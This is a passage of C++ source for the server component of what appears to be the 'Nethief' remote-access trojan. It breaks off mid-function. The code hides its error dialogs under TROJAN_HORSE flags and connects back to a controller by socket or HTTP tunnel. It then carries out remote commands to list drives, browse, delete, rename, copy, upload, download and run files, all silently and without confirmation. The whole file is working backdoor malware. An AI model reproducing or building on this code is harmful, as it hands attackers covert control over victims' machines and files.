// FileSocket.cpp: implementation of the CFileSocket class.
// Download by http://www.NewXing.com
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Server.h"
#include "FileSocket.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//************参数设定*******************

//***************************************

CFileSocket::CFileSocket()
{
	m_ArrayBuffer.SetSize(4096,4096);

	m_pCommunity=((CServerApp*)AfxGetApp())->pCommunity;

	m_pSession=NULL;
	m_pHttpConn=NULL;
	m_pHttpFile=NULL;
}

CFileSocket::~CFileSocket()
{

}

void CFileSocket::Initial()
{
	if(m_pCommunity->m_bIsProxy)
	{
	}
	else
	{
		m_hConnectSocket=socket(AF_INET,SOCK_STREAM,0);
	#if !TROJAN_HORSE
		if(m_hConnectSocket==INVALID_SOCKET)
			AfxMessageBox("socket() failed");
	#endif
	}
}

void CFileSocket::OnSocketClose()
{
	if(m_pCommunity->m_bIsProxy)//全部消毁
	{
		if(m_pHttpFile!=NULL)
		{
			m_pHttpFile->Close();
			delete m_pHttpFile;
			m_pHttpFile=NULL;
		}
		if(m_pHttpConn!=NULL)
		{
			m_pHttpConn->Close();
			delete m_pHttpConn;
			m_pHttpConn=NULL;
		}
		if(m_pSession!=NULL)
		{
			m_pSession->Close();
			delete m_pSession;
			m_pSession=NULL;
		}
	}
	else
	{
		int nRet=closesocket(m_hConnectSocket);
	#if !TROJAN_HORSE
		if(nRet==SOCKET_ERROR)
			AfxMessageBox("closesocket() failed");
	#endif
		Initial();
	}
}

void CFileSocket::ConnectServer()
{
	if(m_pCommunity->m_bIsProxy)//是HTTP隧道连接
	{
	#if ONLINE_TEST
		m_strServerIP=m_pCommunity->IsConnectServer();//看看客户端是不是让自己连接它
		if(m_strServerIP=="")
		{
			return;//不是让自己连接它,返回
		}
	#else
		char hostname[128];
		hostent* hn;
		gethostname(hostname,128);
		hn = gethostbyname(hostname);
		CString strIPAddr;
		for(int j=0;hn->h_addr_list[j]!=NULL;j++)
			strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
		m_strServerIP=strIPAddr;
	#endif
		//核心部分:消息循环////////////////////////////////////////////
		OnSocketClose();//全部消毁

		DWORD dwData=0;

		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwData));//发送HTTP头
		if(!bSucceed)
			return;//失败了,60秒后再试

		bSucceed=HttpTunnelSend(&dwData,sizeof(dwData));//发送HTTP数据
		if(!bSucceed)
			return;//失败了,60秒后再试

		//有一个为空就是出错了,必须跳出循环
		while(m_pSession!=NULL && m_pHttpConn!=NULL && m_pHttpFile!=NULL)
		{
			bSucceed=HttpTunnelRecvHeader();//接收HTTP头,如果没有下一个命令应该在此阻塞...
			if(!bSucceed)//失败了
				return;//下次再尝试重新连接

			DWORD dwCommandID;//接收到的命令ID
			int nCount=HttpTunnelRecv(&dwCommandID,sizeof(dwCommandID));//接收HTTP数据
			if(nCount==-1)//如果连接断开
				return;//下次再尝试重新连接

			RecvCommand(dwCommandID);//处理命令
		}
	}
	else//////////////////////////////////////////////////////////////////////////
	{
		BYTE byOOBData='\0';
		int nRet=send(m_hConnectSocket,(char*)&byOOBData,sizeof(byOOBData),MSG_OOB);
		if(nRet==SOCKET_ERROR)
		{
			DWORD dwErrorCode=WSAGetLastError();
			if(dwErrorCode==WSAECONNRESET||dwErrorCode==WSAECONNABORTED||dwErrorCode==WSAETIMEDOUT)
			{
				OnSocketClose();
			}
			CString strServerIP;
		#if ONLINE_TEST
			strServerIP=m_pCommunity->IsConnectServer();
			if(strServerIP=="")
				return;
		#else
			char hostname[128];
			hostent* hn;
			gethostname(hostname,128);
			hn = gethostbyname(hostname);
			CString strIPAddr;
			for(int j=0;hn->h_addr_list[j]!=NULL;j++)
				strIPAddr=inet_ntoa(*(struct in_addr *)hn->h_addr_list[j]);
			strServerIP=strIPAddr;
		#endif
			////////////////////////////////////////////
			struct sockaddr_in serveraddr;
			serveraddr.sin_family=AF_INET;
			serveraddr.sin_port=htons(60000);
			serveraddr.sin_addr.s_addr=inet_addr(strServerIP);

			int i=0;
			while(1)
			{
				i++;
				int nRet=connect(m_hConnectSocket,(SOCKADDR*)&serveraddr,sizeof(serveraddr));
				if(nRet==SOCKET_ERROR)
				{
					if(i>=3)
					{
						return;
					}
				}
				else
				{
					break;
				}
			}
			WSAAsyncSelect(m_hConnectSocket,AfxGetMainWnd()->m_hWnd,WM_SOCKET,FD_READ|FD_CLOSE);
		}
	}
}

/////////////////////////////////////////////////////////////////
void CFileSocket::RecvCommand(DWORD dwCommandID/*=0*/)
{
	if(dwCommandID==0)
	{
		while(1)
		{
			int nRet=recv(m_hConnectSocket,(char*)&dwCommandID,sizeof(dwCommandID),NULL);
			if(nRet==SOCKET_ERROR)
			{
				return;	//失败
			}
			else
				break;	//成功
		}
	}
	/////////////////////////////////////////////////////////////
	switch(dwCommandID)
	{
		case CMD_IDVERIFY:
		{
			Command_IDVerify();
			break;
		}
		case CMD_DOWNLOADDISKDRIVEINFO:
		{
			Command_DownloadDiskDriveInfo();
			break;
		}
		case CMD_EXPANDDIRECTORY:
		{
			Command_ExpandDirectory();
			break;
		}
		case CMD_SHOWFILELIST:
		{
			Command_ShowFileList();
			break;
		}
		case CMD_RENAMEFILE:
		{
			Command_RenameFile();
			break;
		}
		case CMD_NEWFILE:
		{
			Command_NewFile();
			break;
		}
		case CMD_NEWFOLDER:
		{
			Command_NewFolder();
			break;
		}
		case CMD_DELETEFILE:
		{
			Command_DeleteFile();
			break;
		}
		case CMD_REMOTEPASTE:
		{
			Command_RemotePaste();
			break;
		}
		case CMD_GETOPERATIONOBJECT:
		{
			Command_GetOperationObject();
			break;
		}
		case CMD_DOWNLOADFILE:
		{
			Command_DownloadFile();
			break;
		}
		case CMD_UPLOADFILE:
		{
			Command_UploadFile();
			break;
		}
		case CMD_SHOWPROPERTY_MULTI:
		{
			Command_ShowProperty_Multi();
			break;
		}
		case CMD_SHOWPROPERTY_SINGLE:
		{
			Command_ShowProperty_Single();
			break;
		}
		case CMD_MODIFYPROPERTY_SINGLE:
		{
			Command_ModifyProperty_Single();
			break;
		}
		case CMD_SHOWPROPERTY_DISKDRIVE:
		{
			Command_ShowProperty_Diskdrive();
			break;
		}
		case CMD_MODIFYPROPERTY_DISKDRIVE:
		{
			Command_ModifyProperty_Diskdrive();
			break;
		}
		case CMD_REMOTERUN:
		{
			Command_RemoteRun();
			break;
		}
		case CMD_REMOTEUNINSTALL:
		{
			Command_RemoteUninstall();
			break;
		}
		case CMD_FINDFILE:
		{
			Command_FindFile();
			break;
		}
		case CMD_SHOWNOTE:
		{
			Command_ShowNote();
			break;
		}
		case CMD_GETFILEINFO:
		{
			Command_GetFileInfo();
			break;
		}
	}
}

//////private///////////////////////////////////////////////
void CFileSocket::CStringToChar(char* cText,CString strText,UINT nSize)
{
	if(nSize==NULL)
		nSize=strText.GetLength();
	memcpy(cText,strText.GetBuffer(nSize),nSize);
}

CString CFileSocket::CharToCString(char* cText,UINT nSize)
{
	CString strText;
	memcpy(strText.GetBuffer(nSize),cText,nSize);
	strText.ReleaseBuffer();
	return strText;
}

CString CFileSocket::GetDiskVolume(CString strDiskDriveName)
{
	CString strVolumeNameBuffer;
	GetVolumeInformation(strDiskDriveName,
		strVolumeNameBuffer.GetBufferSetLength(100),100,NULL,NULL,NULL,NULL,NULL);
	strVolumeNameBuffer.ReleaseBuffer();
	return strVolumeNameBuffer;
}

DWORDLONG CFileSocket::GetDiskSpace(CString strDiskDriver,BOOL bFreeSpace)
{
	ULARGE_INTEGER TotalNumberOfBytes;
	ULARGE_INTEGER TotalNumberOfFreeBytes;
	GetDiskFreeSpaceEx(strDiskDriver, NULL,
		&TotalNumberOfBytes, &TotalNumberOfFreeBytes); 
	if(bFreeSpace)
		return TotalNumberOfFreeBytes.QuadPart;
	else
		return TotalNumberOfBytes.QuadPart;
}

void CFileSocket::SearchFile_GetOperationObject(CString strFindDir,int nPathLen,
												CByteArray* pArrayBuffer)
{
	CFileFind f;
	BOOL bExist=f.FindFile(strFindDir+"\\*.*");
	while(bExist)
	{
		bExist=f.FindNextFile();
		CString strPathName=f.GetFilePath();
		if(!f.IsDots())
		{
			if(f.IsDirectory())
			{
				SearchFile_GetOperationObject(strPathName,nPathLen,pArrayBuffer);
			}
			else
			{
				LPCSTR szFilename=strPathName;
				int nFilenameLen=strlen(szFilename);
				nFilenameLen-=nPathLen;
				int nPostion=pArrayBuffer->GetSize();
				pArrayBuffer->SetSize(nPostion+nFilenameLen+1);
				memcpy(&(*pArrayBuffer)[nPostion],szFilename+nPathLen,nFilenameLen+1);
			}
		}
	}
}

void CFileSocket::CreateMultilevelDir(CString strDirName)
{
	if(strDirName.GetAt(strDirName.GetLength()-1)!='\\')
		strDirName+="\\";
	CString strTemp=strDirName;
	while(1)
	{
		int nCount=strTemp.Find("\\");
		if(nCount!=-1)
		{
			CString strDir=strDirName.Mid(0,nCount+1);
			CreateDirectory(strDir,NULL);
			strTemp.SetAt(nCount,'|');
		}
		else
			break;
	}
}

void CFileSocket::FolderStatistic(CString strFindDir,int* nFileCount,
							 int* nFolderCount,DWORD* dwTotalSize)
{
	BOOL bExit;
	CFileFind f;
	bExit=f.FindFile(strFindDir+"*.*");
	while(bExit)
	{
		bExit=f.FindNextFile();
		CString strPathName=f.GetFilePath();

		if(!f.IsDots())
		{
			if(f.IsDirectory())
			{
				(*nFolderCount)++;
				FolderStatistic(strPathName+"\\",nFileCount,nFolderCount,dwTotalSize); //目录文件非"."和"..",则用全路径调用自身
			}
			else
			{
				(*nFileCount)++;
				(*dwTotalSize)+=f.GetLength();
			}
		}
	}
}

void CFileSocket::RegDeleteValue(HKEY hKey,
								 CString sKey,CString sChildKey)
{
	HKEY hChildKey = NULL;  //子键的句柄
	DWORD dwDisposition;
	RegCreateKeyEx(hKey,sKey,0,NULL,REG_OPTION_NON_VOLATILE,
		KEY_CREATE_SUB_KEY | KEY_QUERY_VALUE | 
		KEY_SET_VALUE|KEY_WRITE,NULL,
		&hChildKey,&dwDisposition ) ;
	::RegDeleteValue(hChildKey,sChildKey);
	RegCloseKey(hChildKey); //关闭句柄
}

void CFileSocket::SearchFile(CString strFindDir,CString strFindFile,BOOL bSearchSubdir,
							 CByteArray* pArrayBuffer)
{
	if(bSearchSubdir)
	{
		CFileFind f;
		BOOL bExit=f.FindFile(strFindDir+"*.*");
		while(bExit)
		{
			bExit=f.FindNextFile();
			if(f.IsDirectory())
			{
				if(!f.IsDots())
				{
					SearchFile(f.GetFilePath()+"\\",strFindFile,
						bSearchSubdir,pArrayBuffer); //目录文件非"."和"..",则用全路径调用自身
				}
			}
		}
		f.Close();
	}
	//////////////////////////////////////////////////////
	CFileFind f;
	BOOL bExit=f.FindFile(strFindDir+strFindFile);
	while(bExit)
	{
		bExit=f.FindNextFile();
		if(!f.IsDots())
		{
			CString strPathName=f.GetFilePath();
			BYTE bIsDirectory=(BYTE)f.IsDirectory();

			int nPathNameLen=strPathName.GetLength();
			int nPostion=pArrayBuffer->GetSize();
			pArrayBuffer->SetSize(nPostion+nPathNameLen+1+sizeof(bIsDirectory));
			memcpy(&(*pArrayBuffer)[nPostion],(LPCSTR)strPathName,nPathNameLen+1);
			memcpy(&(*pArrayBuffer)[nPostion]+nPathNameLen+1,&bIsDirectory,sizeof(bIsDirectory));
		}
	}
	f.Close();
}

//查找指定文件是否存在
BOOL CFileSocket::IsFileExist(CString strFilename)
{
	CFileFind f;
	return f.FindFile(strFilename);
}

/////////////////////////////////////////////////////////////////////////
void CFileSocket::Command_IDVerify()
{
	RECV_IDVERIFY_INFO RecvIDVerifyInfo;
	ZeroMemory(&RecvIDVerifyInfo,sizeof(RecvIDVerifyInfo));
	CStringToChar(RecvIDVerifyInfo.cSoftwareName,"Nethief_Server");
	CStringToChar(RecvIDVerifyInfo.cHostName,m_pCommunity->m_strHostName);

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(RecvIDVerifyInfo));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&RecvIDVerifyInfo,sizeof(RecvIDVerifyInfo));
}

void CFileSocket::Command_DownloadDiskDriveInfo()
{
	RECV_DISKDRIVE_INFO RecvDiskDriveInfo;
	m_ArrayBuffer.SetSize(0);
	
	for(int i='A';i<'[';i++)//从"A"到"Z"来一遍
	{
		CString strDiskDriveName=(CString)i+":\\";
		DWORD dwType=GetDriveType(strDiskDriveName);
		switch(dwType)
		{
			case DRIVE_REMOVABLE://软盘驱动器
			{
				ZeroMemory(&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				RecvDiskDriveInfo.dwType=dwType;
				
				int nPostion=m_ArrayBuffer.GetSize();
				m_ArrayBuffer.SetSize(nPostion+sizeof(RecvDiskDriveInfo));
				memcpy(&m_ArrayBuffer[nPostion],&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				break;
			}
			case DRIVE_FIXED://硬盘驱动器
			{
				ZeroMemory(&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				RecvDiskDriveInfo.dwType=dwType;
				CString strVolumeName=GetDiskVolume(strDiskDriveName);
				CStringToChar(RecvDiskDriveInfo.cVolumeName,strVolumeName);

				int nPostion=m_ArrayBuffer.GetSize();
				m_ArrayBuffer.SetSize(nPostion+sizeof(RecvDiskDriveInfo));
				memcpy(&m_ArrayBuffer[nPostion],&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				break;
			}
			case DRIVE_CDROM://光盘驱动器
			{
				ZeroMemory(&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				RecvDiskDriveInfo.dwType=dwType;
				
				int nPostion=m_ArrayBuffer.GetSize();
				m_ArrayBuffer.SetSize(nPostion+sizeof(RecvDiskDriveInfo));
				memcpy(&m_ArrayBuffer[nPostion],&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				break;
			}
			case DRIVE_REMOTE:
			{
				ZeroMemory(&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				RecvDiskDriveInfo.dwType=dwType;

				SHFILEINFO shFileInfo;
				SHGetFileInfo(strDiskDriveName,0,&shFileInfo,sizeof(SHFILEINFO),
					SHGFI_DISPLAYNAME|SHGFI_ICON|SHGFI_SMALLICON);
				DestroyIcon(shFileInfo.hIcon);
				CString strVolumeName=(LPCSTR)shFileInfo.szDisplayName;
				CStringToChar(RecvDiskDriveInfo.cVolumeName,strVolumeName);

				int nPostion=m_ArrayBuffer.GetSize();
				m_ArrayBuffer.SetSize(nPostion+sizeof(RecvDiskDriveInfo));
				memcpy(&m_ArrayBuffer[nPostion],&RecvDiskDriveInfo,sizeof(RecvDiskDriveInfo));
				break;
			}
		}
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
}

void CFileSocket::Command_ExpandDirectory()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	CString strPath;
	memcpy(strPath.GetBufferSetLength(dwParamSize),m_ArrayBuffer.GetData(),dwParamSize);
	m_ArrayBuffer.SetSize(0);
	//////////////////////////////////////////////////////////////
	CFileFind f;
	BOOL bExit=f.FindFile(strPath+"*.*");
	if(GetLastError()==ERROR_NOT_READY)//如果读盘错误
	{
		DWORD dwErrorCode=0;
		m_ArrayBuffer.SetSize(sizeof(dwErrorCode));
		memcpy(m_ArrayBuffer.GetData(),&dwErrorCode,sizeof(dwErrorCode));
	}
	else
	{
		while(bExit)
		{
			bExit=f.FindNextFile();
			if(f.IsDirectory())//当前文件是目录
			{
				if(!f.IsDots())	//目录文件非"."和".."
				{
					CString strDirName=f.GetFileName();
					BYTE byHasChildren=FALSE;
					////////////////////////////////////////
					CFileFind f1;
					BOOL bExit1=f1.FindFile(strPath+strDirName+"\\*.*");
					while(bExit1)
					{
						bExit1=f1.FindNextFile();
						if(f1.IsDirectory())//当前文件是目录
						{
							if(!f1.IsDots())	//目录文件非"."和".."
							{
								byHasChildren=TRUE;
								break;
							}
						}
					}
					f1.Close();
					/////////////////////////////////////////
					DWORD dwPosition=m_ArrayBuffer.GetSize();
					DWORD dwDirNameLength=strDirName.GetLength();
					m_ArrayBuffer.SetSize(dwPosition+dwDirNameLength+1+sizeof(byHasChildren));
					memcpy(&m_ArrayBuffer[dwPosition],(LPCSTR)strDirName,dwDirNameLength+1);
					memcpy(&m_ArrayBuffer[dwPosition]+dwDirNameLength+1,&byHasChildren,sizeof(byHasChildren));
				}
			}
		}
	}
	f.Close();

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
}

void CFileSocket::Command_ShowFileList()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	CString strPath;
	memcpy(strPath.GetBufferSetLength(dwParamSize),m_ArrayBuffer.GetData(),dwParamSize);
	m_ArrayBuffer.SetSize(0);
	//////////////////////////////////////////////////////////////
	CFileFind f;
	BOOL bExit=f.FindFile(strPath+"*.*");
	if(GetLastError()==ERROR_NOT_READY)//如果读盘错误
	{
		DWORD dwErrorCode=0;
		m_ArrayBuffer.SetSize(sizeof(dwErrorCode));
		memcpy(m_ArrayBuffer.GetData(),&dwErrorCode,sizeof(dwErrorCode));
	}
	else
	{
		while(bExit)
		{
			bExit=f.FindNextFile();
			if(!f.IsDots())
			{
				CString strFilename=f.GetFileName();//得到文件名
				DWORD dwFileLength;//得到文件长度
				if(f.IsDirectory())
					dwFileLength=0xFFFFFFFF;//如果是目录,文件长度为0xFFFFFFFF
				else
					dwFileLength=f.GetLength();
				FILETIME filetime;
				f.GetLastWriteTime(&filetime);//得到文件最后修改时间
				//////////////////////////////////////////////////////////////////////////
				CString strExtension=strFilename.Right(4);//得到文件扩展名
				strExtension.MakeUpper();
				if(strExtension==".EXE" && dwFileLength!=0xFFFFFFFF)//是以.EXE结尾,并且不是目录
				{
					ICONINFO stIconInfo;//图标信息
					HICON hExeIcon=NULL;//EXE文件图标

					SHFILEINFO shFileInfo;
					if(SHGetFileInfo(f.GetFilePath(),0,&shFileInfo,sizeof(SHFILEINFO),
						SHGFI_ICON|SHGFI_SMALLICON))//得到EXE文件的图标
					{
						GetIconInfo(shFileInfo.hIcon,&stIconInfo);//得到图标信息
					}
					else//如果是回收站里的EXE文件,只能以这种方法得到图标
					{
						ExtractIconEx(f.GetFilePath(),0,NULL,&hExeIcon,1);//得到EXE文件的图标
						GetIconInfo(hExeIcon,&stIconInfo);//得到图标信息
					}

					CBitmap* pBitmapMask=CBitmap::FromHandle(stIconInfo.hbmMask);//转成BMP
					BITMAP stBitmapMask;
					pBitmapMask->GetObject(sizeof(stBitmapMask),&stBitmapMask);//得到BMP信息

					DWORD dwCountMask=stBitmapMask.bmWidthBytes*stBitmapMask.bmHeight;//算出BMP大小
					BYTE* pbyBitsMask=new BYTE[dwCountMask];
					pBitmapMask->GetBitmapBits(dwCountMask,pbyBitsMask);//复制BMP

					RECV_BITMAP_INFO stRecvBitmapInfoMask;//要传送的BMP信息
					stRecvBitmapInfoMask.bmType=stBitmapMask.bmType;
					stRecvBitmapInfoMask.bmWidth=stBitmapMask.bmWidth;
					stRecvBitmapInfoMask.bmHeight=stBitmapMask.bmHeight;
					stRecvBitmapInfoMask.bmWidthBytes=stBitmapMask.bmWidthBytes;
					stRecvBitmapInfoMask.bmPlanes=stBitmapMask.bmPlanes;
					stRecvBitmapInfoMask.bmBitsPixel=stBitmapMask.bmBitsPixel;
					stRecvBitmapInfoMask.dwBitsCount=dwCountMask;//BMP大小
					/////////////////////////////////////////////////
					CBitmap* pBitmapColor=CBitmap::FromHandle(stIconInfo.hbmColor);//转成BMP

					DWORD dwCountColor=16*16*sizeof(COLORREF);//算出BMP大小
					BYTE* pbyBitsColor=new BYTE[dwCountColor];

					CDC ScreenDC;
					ScreenDC.CreateDC("DISPLAY",NULL,NULL,NULL);//得到屏幕DC

					CDC MemDC;
					MemDC.CreateCompatibleDC(&ScreenDC);//建立兼容DC
					MemDC.SelectObject(pBitmapColor);//选入Bitmap

					//保存每个象素的颜色
					DWORD dwPos=0;
					for(int i=0;i<16;i++)
					{
						for(int j=0;j<16;j++)
						{
							COLORREF crColor=MemDC.GetPixel(j,i);
							memcpy(pbyBitsColor+dwPos,&crColor,sizeof(crColor));
							dwPos+=sizeof(crColor);
						}
					}
					MemDC.DeleteDC();//删除兼容DC
					ScreenDC.DeleteDC();//删除屏幕DC
					/////////////////////////////////////////////////
					DWORD dwPosition=m_ArrayBuffer.GetSize();
					DWORD dwFilenameLength=strFilename.GetLength();
					m_ArrayBuffer.SetSize(dwPosition+dwFilenameLength+1+sizeof(dwFileLength)+
						sizeof(stRecvBitmapInfoMask)+dwCountMask+
						dwCountColor+
						sizeof(filetime));
					memcpy(&m_ArrayBuffer[dwPosition],(LPCSTR)strFilename,dwFilenameLength+1);
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1,&dwFileLength,sizeof(dwFileLength));
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1+sizeof(dwFileLength),&stRecvBitmapInfoMask,sizeof(stRecvBitmapInfoMask));
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1+sizeof(dwFileLength)+sizeof(stRecvBitmapInfoMask),pbyBitsMask,dwCountMask);
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1+sizeof(dwFileLength)+sizeof(stRecvBitmapInfoMask)+dwCountMask,pbyBitsColor,dwCountColor);
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1+sizeof(dwFileLength)+sizeof(stRecvBitmapInfoMask)+dwCountMask+dwCountColor,&filetime,sizeof(filetime));
					//////////////////////////////////////////////////////////////////
					DestroyIcon(shFileInfo.hIcon);//消毁图标
					pBitmapMask->DeleteObject();//删除Bitmap对象
					pBitmapColor->DeleteObject();//删除Bitmap对象
					delete[] pbyBitsMask;//删除指针
					delete[] pbyBitsColor;//删除指针
				}
				else//不是EXE文件
				{
					DWORD dwPosition=m_ArrayBuffer.GetSize();
					DWORD dwFilenameLength=strFilename.GetLength();
					m_ArrayBuffer.SetSize(dwPosition+dwFilenameLength+1+sizeof(dwFileLength)+sizeof(filetime));
					memcpy(&m_ArrayBuffer[dwPosition],(LPCSTR)strFilename,dwFilenameLength+1);
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1,&dwFileLength,sizeof(dwFileLength));
					memcpy(&m_ArrayBuffer[dwPosition]+dwFilenameLength+1+sizeof(dwFileLength),&filetime,sizeof(filetime));
				}
				//////////////////////////////////////////////////////////////////////////
			}
		}
	}
	f.Close();

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,1,m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
}

void CFileSocket::Command_RenameFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPSTR szPath=(LPSTR)&m_ArrayBuffer[0];
	LPSTR szFilename1=(LPSTR)&m_ArrayBuffer[0]+strlen(szPath)+1;
	LPSTR szFilename2=(LPSTR)&m_ArrayBuffer[0]+strlen(szPath)+1+strlen(szFilename1)+1;
	//////////////////////////////////////////////////////////////
	CString strFrom=szPath;
	strFrom+=szFilename1;
	CString strTo=szPath;
	strTo+=szFilename2;

	int nStrLength=strFrom.GetLength();
	strFrom.GetBufferSetLength(nStrLength+1);
	strFrom.SetAt(nStrLength,'\0');
	nStrLength=strTo.GetLength();
	strTo.GetBufferSetLength(nStrLength+1);
	strTo.SetAt(nStrLength,'\0');

	SHFILEOPSTRUCT shFileOp;
	ZeroMemory(&shFileOp,sizeof(shFileOp));
	shFileOp.hwnd=NULL;
	shFileOp.wFunc=FO_RENAME;
	shFileOp.pFrom=strFrom;
	shFileOp.pTo=strTo;
	shFileOp.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_SILENT;
	SHFileOperation(&shFileOp);

	DWORD dwErrorCode;
	CFileFind f;
	if(f.FindFile(strFrom))
		dwErrorCode=1;
	else
		dwErrorCode=0;

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_NewFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szFullFilename=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	DWORD dwErrorCode=0;
	HANDLE hFile=CreateFile(szFullFilename,NULL,
		FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		CREATE_NEW,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		dwErrorCode=1;
	}
	CloseHandle(hFile);

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_NewFolder()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szFullFilename=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	DWORD dwErrorCode=0;
	if(!CreateDirectory(szFullFilename,NULL))
	{
		dwErrorCode=1;
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_DeleteFile()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPCSTR szFrom=(char*)m_ArrayBuffer.GetData();
	//////////////////////////////////////////////////////////////
	SHFILEOPSTRUCT shFileOp;
	ZeroMemory(&shFileOp,sizeof(shFileOp));
	shFileOp.hwnd=NULL;
	shFileOp.wFunc=FO_DELETE;
	shFileOp.pFrom=szFrom;
	shFileOp.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_SILENT;
	DWORD dwErrorCode=0;
	if(SHFileOperation(&shFileOp))
	{
		dwErrorCode=1;
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
			return;
	}
	SendCommandData(m_hConnectSocket,0,(BYTE*)&dwErrorCode,sizeof(dwErrorCode));
}

void CFileSocket::Command_RemotePaste()
{
	DWORD dwParamSize=RecvCommandParamSize(m_hConnectSocket);
	if(dwParamSize==0)
		return;
	m_ArrayBuffer.SetSize(dwParamSize);
	BOOL bRet=RecvCommandParam(m_hConnectSocket,m_ArrayBuffer.GetData(),dwParamSize);
	if(!bRet)
		return;

	LPDWORD pdwFOFlags=(LPDWORD)&m_ArrayBuffer[0];
	LPCSTR szTo=(char*)&m_ArrayBuffer[0]+sizeof(*pdwFOFlags);
	LPCSTR szFrom=(char*)&m_ArrayBuffer[0]+sizeof(*pdwFOFlags)+strlen(szTo)+2;
	//////////////////////////////////////////////////////////////
	SHFILEOPSTRUCT shFileOp;
	ZeroMemory(&shFileOp,sizeof(shFileOp));
	shFileOp.hwnd=NULL;
	shFileOp.wFunc=*pdwFOFlags;
	shFileOp.pFrom=szFrom;
	shFileOp.pTo=szTo;
	shFileOp.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_SILENT;
	DWORD dwErrorCode=0;
	if(SHFileOperation(&shFileOp))
	{
		dwErrorCode=1;
	}

	if(m_pCommunity->m_bIsProxy)
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(dwErrorCode));
		if(!bSucceed)
